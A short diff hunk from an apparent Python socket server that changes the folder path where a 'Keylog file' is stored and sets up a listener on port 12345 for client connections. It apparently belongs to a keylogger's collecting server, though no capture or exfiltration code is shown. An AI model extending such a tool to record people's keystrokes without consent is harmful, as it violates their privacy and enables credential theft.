@@ -68,7 +68,7 @@ butlist = []
 #List Of Client Sockets
 clients = []
 #Base Path to store Keylog file
-base_path = "C:\\Users\\Sony\\Desktop\\Mehmood\\Python\\"
+base_path = "C:\\Users\\Sony\\Desktop\\Mehmood\\Vlabs\\"
 
 server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 server.bind((socket.gethostname(),12345))
